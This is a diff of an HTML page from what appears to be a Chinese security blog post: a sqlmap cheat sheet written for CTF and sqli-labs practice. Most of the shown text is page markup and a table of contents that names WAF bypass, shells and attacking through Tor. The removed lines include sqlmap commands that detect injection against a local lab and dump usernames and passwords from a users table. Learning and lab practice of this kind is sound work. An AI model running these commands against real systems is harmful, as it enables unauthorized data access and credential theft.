@@ -1,32 +1,17 @@
 <!DOCTYPE html>
-<html>
+<html lang=zh>
 <head>
-    
-
-    
-
-    
-
-
-
+    <!-- so meta -->
     <meta charset="utf-8">
-    
-    
-    
-    
-    <title>sqlmap操作详解(常用备忘录) | osword&#39;s blog | 小刀</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-    <meta name="theme-color" content="#3F51B5">
-    
-    
-    <meta name="keywords" content="SQL注入">
-    <meta name="description" content="前言以前整理了些，在一些ＣＴＦ中发现随着编码、消毒、注入类型的改变有点不够用了。遂又熬了通宵整理了ｓｑｌｍａｐ使用和ｓｑｌ过waf技巧。后续持续更新 常规盲注爆库爆表爆列爆字段（适用较多数据库类型）判断能否注入sqlmap -u &quot;http:&#x2F;&#x2F;192.168.43.195&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot;">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言以前整理了些，在一些ＣＴＦ中发现随着编码、消毒、注入类型的改变有点不够用了。遂又熬了通宵整理了ｓｑｌｍａｐ使用和ｓｑｌ过waf技巧。后续持续更新 常规盲注爆库爆表爆列爆字段（适用较多数据库类型）判断能否注入sqlmap -u &quot;http:&#x2F;&#x2F;192.168.43.195&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; 猜解表sqlmap -u &quot;http:&#x2F;&#x2F;192">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqlmap操作详解(常用备忘录)">
 <meta property="og:url" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/index.html">
 <meta property="og:site_name" content="osword&#39;s blog">
-<meta property="og:description" content="前言以前整理了些，在一些ＣＴＦ中发现随着编码、消毒、注入类型的改变有点不够用了。遂又熬了通宵整理了ｓｑｌｍａｐ使用和ｓｑｌ过waf技巧。后续持续更新 常规盲注爆库爆表爆列爆字段（适用较多数据库类型）判断能否注入sqlmap -u &quot;http:&#x2F;&#x2F;192.168.43.195&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot;">
+<meta property="og:description" content="前言以前整理了些，在一些ＣＴＦ中发现随着编码、消毒、注入类型的改变有点不够用了。遂又熬了通宵整理了ｓｑｌｍａｐ使用和ｓｑｌ过waf技巧。后续持续更新 常规盲注爆库爆表爆列爆字段（适用较多数据库类型）判断能否注入sqlmap -u &quot;http:&#x2F;&#x2F;192.168.43.195&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; 猜解表sqlmap -u &quot;http:&#x2F;&#x2F;192">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/1.png">
 <meta property="og:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/2.png">
@@ -45,257 +30,152 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/1.png">
     
-        <link rel="alternate" type="application/atom+xml" title="osword&#39;s blog" href="/atom.xml">
     
-    <link rel="shortcut icon" href="/favicon.ico">
-    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
-    <script>window.lazyScripts=[]</script>
-
-    <!-- custom head -->
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
     
+    <!-- title -->
+    <title>sqlmap操作详解(常用备忘录)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
+    
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-<body>
-    <div id="loading" class="active"></div>
-
-    <aside id="menu" class="hide" >
-  <div class="inner flex-row-vertical">
-    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
-        <i class="icon icon-lg icon-close"></i>
-    </a>
-    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
-      <div class="brand">
-        <a href="/" class="avatar waves-effect waves-circle waves-light">
-          <img src="/img/avatar.jpg">
-        </a>
-        <hgroup class="introduce">
-          <h5 class="nickname">osword</h5>
-          <a href="mailto:929337105@qq.com" title="929337105@qq.com" class="mail">929337105@qq.com</a>
-        </hgroup>
-      </div>
-    </div>
-    <div class="scroll-wrap flex-col">
-      <ul class="nav">
-        
-            <li class="waves-block waves-effect">
-              <a href="/"  >
-                <i class="icon icon-lg icon-home"></i>
-                主页
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/archives"  >
-                <i class="icon icon-lg icon-archives"></i>
-                Archives
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://zhzhdoai.github.io/"  >
-                <i class="icon icon-lg icon-友链"></i>
-                友链
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://glotozz.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-glotozz"></i>
-                Glotozz
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://nikoeurus.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-sommus"></i>
-                Sommus
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://mochazz.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-mochazz@七月火"></i>
-                Mochazz 七月火
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://tea9.xyz/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-tea9"></i>
-                Tea 9
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://wulidecade.cn/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-Decade"></i>
-                Decade
-              </a>
-            </li>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
         
       </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/02/26/%E8%BD%AC%E8%BD%BD-WAF%E6%94%BB%E9%98%B2%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E7%AF%87/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/02/20/PHP%E4%B9%8BGET%E4%BC%A0%E5%8F%82%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&text=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&is_video=false&description=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqlmap操作详解(常用备忘录)&body=Check out this article: http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&name=sqlmap操作详解(常用备忘录)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&t=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
     </div>
-  </div>
-</aside>
-
-    <main id="main">
-        <header class="top-header" id="header">
-    <div class="flex-row">
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
-          <i class="icon icon-lg icon-navicon"></i>
-        </a>
-        <div class="flex-col header-title ellipsis">sqlmap操作详解(常用备忘录)</div>
-        
-        <div class="search-wrap" id="search-wrap">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
-                <i class="icon icon-lg icon-chevron-left"></i>
-            </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
-                <i class="icon icon-lg icon-search"></i>
-            </a>
-        </div>
-        
-        
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
-            <i class="icon icon-lg icon-share-alt"></i>
-        </a>
-        
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"><span class="toc-number">2.</span> <span class="toc-text">常规盲注爆库爆表爆列爆字段（适用较多数据库类型）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#判断能否注入"><span class="toc-number">2.1.</span> <span class="toc-text">判断能否注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#猜解表"><span class="toc-number">2.2.</span> <span class="toc-text">猜解表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#猜解列名"><span class="toc-number">2.3.</span> <span class="toc-text">猜解列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#猜解字段"><span class="toc-number">2.4.</span> <span class="toc-text">猜解字段</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用cookies"><span class="toc-number">3.</span> <span class="toc-text">利用cookies</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#尝试是否存在注入"><span class="toc-number">3.1.</span> <span class="toc-text">尝试是否存在注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆库"><span class="toc-number">3.2.</span> <span class="toc-text">爆库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLmap用于mysql注入"><span class="toc-number">4.</span> <span class="toc-text">SQLmap用于mysql注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap中post登陆框注入"><span class="toc-number">5.</span> <span class="toc-text">sqlmap中post登陆框注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#交互式-shell"><span class="toc-number">6.</span> <span class="toc-text">交互式 shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#伪静态网页注入"><span class="toc-number">7.</span> <span class="toc-text">伪静态网页注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap绕过WAF防火墙"><span class="toc-number">8.</span> <span class="toc-text">sqlmap绕过WAF防火墙</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tor代理与跳板"><span class="toc-number">9.</span> <span class="toc-text">Tor代理与跳板</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#使用-Tor-网络当连接到目标网站攻击"><span class="toc-number">10.</span> <span class="toc-text">使用 Tor 网络当连接到目标网站攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#任意注射点"><span class="toc-number">11.</span> <span class="toc-text">任意注射点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#定制注射负载"><span class="toc-number">12.</span> <span class="toc-text">定制注射负载</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#水平选择"><span class="toc-number">13.</span> <span class="toc-text">水平选择</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#页面比较"><span class="toc-number">14.</span> <span class="toc-text">页面比较</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql注入技术选择"><span class="toc-number">15.</span> <span class="toc-text">sql注入技术选择</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#union查询中的sql注入条件修改"><span class="toc-number">16.</span> <span class="toc-text">union查询中的sql注入条件修改</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#注入文件xml学习"><span class="toc-number">17.</span> <span class="toc-text">注入文件xml学习</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#列出数据库信息-包含列出库表列"><span class="toc-number">18.</span> <span class="toc-text">列出数据库信息(包含列出库表列)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#–current-user-：会话用户查询"><span class="toc-number">18.1.</span> <span class="toc-text">–current-user ：会话用户查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–current-db-当前数据库"><span class="toc-number">18.2.</span> <span class="toc-text">–current-db : 当前数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–hostname-服务器主机名"><span class="toc-number">18.3.</span> <span class="toc-text">–hostname : 服务器主机名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–is-dba-检测会话用户是否是数据库管理员"><span class="toc-number">18.4.</span> <span class="toc-text">–is-dba : 检测会话用户是否是数据库管理员</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–users-：-列出数据库管理系统用户"><span class="toc-number">18.5.</span> <span class="toc-text">–users ： 列出数据库管理系统用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–passwords-列出并列出数据库管理员用户的密码hash"><span class="toc-number">18.6.</span> <span class="toc-text">–passwords : 列出并列出数据库管理员用户的密码hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–privileges-：列出数据库管理系统用户权限"><span class="toc-number">18.7.</span> <span class="toc-text">–privileges ：列出数据库管理系统用户权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–roles-：列出数据库管理系统用户角色"><span class="toc-number">18.8.</span> <span class="toc-text">–roles ：列出数据库管理系统用户角色</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#列出除系统数据库以外的表"><span class="toc-number">18.9.</span> <span class="toc-text">列出除系统数据库以外的表</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#转存数据库表目"><span class="toc-number">19.</span> <span class="toc-text">转存数据库表目</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#运行自定义SQL语句"><span class="toc-number">20.</span> <span class="toc-text">运行自定义SQL语句</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#新用户运行可执行命令"><span class="toc-number">21.</span> <span class="toc-text">新用户运行可执行命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#搜索数据库常用参数整理"><span class="toc-number">22.</span> <span class="toc-text">搜索数据库常用参数整理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#–temper选择总结"><span class="toc-number">23.</span> <span class="toc-text">–temper选择总结</span></a></li></ol>
     </div>
-</header>
-<header class="content-header post-header">
-
-    <div class="container fade-scale">
-        <h1 class="title">sqlmap操作详解(常用备忘录)</h1>
-        <h5 class="subtitle">
-            
-                <time datetime="2019-02-25T12:51:41.000Z" itemprop="datePublished" class="page-time">
-  2019-02-25
-</time>
-
-
-            
-        </h5>
-    </div>
+  </span>
+</div>
 
     
-
-
-</header>
-
-
-<div class="container body-wrap">
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
     
-    <aside class="post-widget">
-        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
-            <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"><span class="post-toc-number">2.</span> <span class="post-toc-text">常规盲注爆库爆表爆列爆字段（适用较多数据库类型）</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#判断能否注入"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">判断能否注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#猜解表"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">猜解表</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#猜解列名"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">猜解列名</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#猜解字段"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">猜解字段</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用cookies"><span class="post-toc-number">3.</span> <span class="post-toc-text">利用cookies</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#尝试是否存在注入"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">尝试是否存在注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#爆库"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">爆库</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQLmap用于mysql注入"><span class="post-toc-number">4.</span> <span class="post-toc-text">SQLmap用于mysql注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#sqlmap中post登陆框注入"><span class="post-toc-number">5.</span> <span class="post-toc-text">sqlmap中post登陆框注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#交互式-shell"><span class="post-toc-number">6.</span> <span class="post-toc-text">交互式 shell</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#伪静态网页注入"><span class="post-toc-number">7.</span> <span class="post-toc-text">伪静态网页注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#sqlmap绕过WAF防火墙"><span class="post-toc-number">8.</span> <span class="post-toc-text">sqlmap绕过WAF防火墙</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Tor代理与跳板"><span class="post-toc-number">9.</span> <span class="post-toc-text">Tor代理与跳板</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#使用-Tor-网络当连接到目标网站攻击"><span class="post-toc-number">10.</span> <span class="post-toc-text">使用 Tor 网络当连接到目标网站攻击</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#任意注射点"><span class="post-toc-number">11.</span> <span class="post-toc-text">任意注射点</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#定制注射负载"><span class="post-toc-number">12.</span> <span class="post-toc-text">定制注射负载</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#水平选择"><span class="post-toc-number">13.</span> <span class="post-toc-text">水平选择</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#页面比较"><span class="post-toc-number">14.</span> <span class="post-toc-text">页面比较</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#sql注入技术选择"><span class="post-toc-number">15.</span> <span class="post-toc-text">sql注入技术选择</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#union查询中的sql注入条件修改"><span class="post-toc-number">16.</span> <span class="post-toc-text">union查询中的sql注入条件修改</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#注入文件xml学习"><span class="post-toc-number">17.</span> <span class="post-toc-text">注入文件xml学习</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#列出数据库信息-包含列出库表列"><span class="post-toc-number">18.</span> <span class="post-toc-text">列出数据库信息(包含列出库表列)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–current-user-：会话用户查询"><span class="post-toc-number">18.1.</span> <span class="post-toc-text">–current-user ：会话用户查询</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–current-db-当前数据库"><span class="post-toc-number">18.2.</span> <span class="post-toc-text">–current-db : 当前数据库</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–hostname-服务器主机名"><span class="post-toc-number">18.3.</span> <span class="post-toc-text">–hostname : 服务器主机名</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–is-dba-检测会话用户是否是数据库管理员"><span class="post-toc-number">18.4.</span> <span class="post-toc-text">–is-dba : 检测会话用户是否是数据库管理员</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–users-：-列出数据库管理系统用户"><span class="post-toc-number">18.5.</span> <span class="post-toc-text">–users ： 列出数据库管理系统用户</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–passwords-列出并列出数据库管理员用户的密码hash"><span class="post-toc-number">18.6.</span> <span class="post-toc-text">–passwords : 列出并列出数据库管理员用户的密码hash</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–privileges-：列出数据库管理系统用户权限"><span class="post-toc-number">18.7.</span> <span class="post-toc-text">–privileges ：列出数据库管理系统用户权限</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–roles-：列出数据库管理系统用户角色"><span class="post-toc-number">18.8.</span> <span class="post-toc-text">–roles ：列出数据库管理系统用户角色</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#列出除系统数据库以外的表"><span class="post-toc-number">18.9.</span> <span class="post-toc-text">列出除系统数据库以外的表</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#转存数据库表目"><span class="post-toc-number">19.</span> <span class="post-toc-text">转存数据库表目</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#运行自定义SQL语句"><span class="post-toc-number">20.</span> <span class="post-toc-text">运行自定义SQL语句</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#新用户运行可执行命令"><span class="post-toc-number">21.</span> <span class="post-toc-text">新用户运行可执行命令</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#搜索数据库常用参数整理"><span class="post-toc-number">22.</span> <span class="post-toc-text">搜索数据库常用参数整理</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#–temper选择总结"><span class="post-toc-number">23.</span> <span class="post-toc-text">–temper选择总结</span></a></li></ol>
-        </nav>
-    </aside>
+    <h1 class="posttitle" itemprop="name headline">
+        sqlmap操作详解(常用备忘录)
+    </h1>
 
 
-<article id="post-sqlmap操作(sqlilabs)"
-  class="post-article article-type-post fade" itemprop="blogPost">
 
-    <div class="post-card">
-        <h1 class="post-card-title">sqlmap操作详解(常用备忘录)</h1>
-        <div class="post-meta">
-            <time class="post-time" title="2019-02-25 20:51:41" datetime="2019-02-25T12:51:41.000Z"  itemprop="datePublished">2019-02-25</time>
-
-            
-
-
-            
-<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
-    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
-</span>
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">osword's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-02-25T12:51:41.000Z" itemprop="datePublished">2019-02-25</time>
+        
+      
+    </div>
 
 
-        </div>
-        <div class="post-content" id="post-content" itemprop="postContent">
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前整理了些，在一些ＣＴＦ中发现随着编码、消毒、注入类型的改变有点不够用了。遂又熬了通宵整理了ｓｑｌｍａｐ使用和ｓｑｌ过waf技巧。后续持续更新</p>
-<h1 id="常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"><a href="#常规盲注爆库爆表爆列爆字段（适用较多数据库类型）" class="headerlink" title="常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"></a>常规盲注爆库爆表爆列爆字段（适用较多数据库类型）</h1><h2 id="判断能否注入"><a href="#判断能否注入" class="headerlink" title="判断能否注入"></a>判断能否注入</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot;</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<h2 id="猜解表"><a href="#猜解表" class="headerlink" title="猜解表"></a>猜解表</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --tables</code><br>》》指定数据库表名<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --tables -D security</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./2.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<h2 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --columns -T users</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./3.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<h2 id="猜解字段"><a href="#猜解字段" class="headerlink" title="猜解字段"></a>猜解字段</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --dump -T users -C &quot;username,password,id&quot;</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./4.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<h1 id="利用cookies"><a href="#利用cookies" class="headerlink" title="利用cookies"></a>利用cookies</h1><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./5.png" alt="" title="">
-                </div>
